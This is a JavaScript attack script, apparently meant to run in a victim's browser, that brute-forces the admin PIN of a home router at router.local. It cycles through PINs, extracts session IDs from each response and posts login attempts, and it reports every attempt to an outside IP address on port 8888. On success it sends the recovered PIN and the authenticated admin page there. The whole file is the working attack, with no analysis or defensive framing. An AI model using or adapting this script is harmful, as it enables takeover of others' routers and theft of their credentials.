var START = 0;
var END = 1000;
var LOGINURL = 'http://router.local/login.php';
var xhrs = [];
function guessToPin(guess) {
  return ('0000' + guess).substr(-4, 4);
}
function responseToSessID(response) {
  return response.match(/[0-9a-z]{20,}/g)[0];
}
function isGoodResponse(response) {
  var matched = response.match(/Authentication Required/g);
  return !matched || matched.length != 1;
}
function sendSuccessfulMessage(goodguess, html) {
  var xhr4 = new XMLHttpRequest();
  xhr4.open('POST', 'http://18.217.54.18:8888', true);
  xhr4.send('pinnum=' + guessToPin(goodguess) + '&success=' + html);
  xhrs.push(xhr4);
}
function sendAllFailMessage(badguess) {
  var xhr4 = new XMLHttpRequest();
  xhr4.open('POST', 'http://18.217.54.18:8888', true);
  xhr4.send('pinnum=' + guessToPin(badguess) + '&ALLFAILED=true');
  xhrs.push(xhr4);
}
function sendThisFailMessage(badguess) {
  var xhr4 = new XMLHttpRequest();
  xhr4.open('POST', 'http://18.217.54.18:8888', true);
  xhr4.send('pinnum=' + guessToPin(badguess) + '&failed=true');
  xhrs.push(xhr4);
}
function sendHereMessage() {
  var xhr4 = new XMLHttpRequest();
  xhr4.open('POST', 'http://18.217.54.18:8888', true);
  xhr4.send('here=True');
  xhrs.push(xhr4);
}
function composePOSTMessage(sessid, pin) {
  return 'PHPSESSID=' + sessid + '&username=admin&pin=' + pin + '&' + 'notRobot=on';
}
function process(response, currguess) {
  if (isGoodResponse(response)) {
    sendSuccessfulMessage(currguess, response);
    return;
  } else {
    if (currguess == END) {
      sendAllFailMessage(currguess);
      return;
    }
    sendThisFailMessage(currguess);
    var xhr5 = new XMLHttpRequest();
    xhr5.open('POST', LOGINURL, true);
    xhr5.onload = createFunc(xhr5, currguess + 1, true);
    xhr5.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr5.send(composePOSTMessage(responseToSessID(response), guessToPin(currguess + 1)));
    xhrs.push(xhr5);
  }
}
function createFunc(xhr, currguess, guessed) {
  return function(e) {
    if (guessed) {
      process(xhr.response, currguess);
    } else {
      var xhr3 = new XMLHttpRequest();
      xhr3.open('POST', LOGINURL, true);
      xhr3.onload = function(event) {
	process(xhr3.response, currguess);
      };
      xhr3.send(composePOSTMessage(responseToSessID(xhr.response), guessToPin(currguess)));
      xhrs.push(xhr3);
    }
  };
}
sendThisFailMessage(1234);
var xhr = new XMLHttpRequest();
var f = createFunc(xhr, START, false);
xhr.onload = f;
xhr.open('GET', 'http:router.local');
xhr.send('');
xhrs.push(xhr);
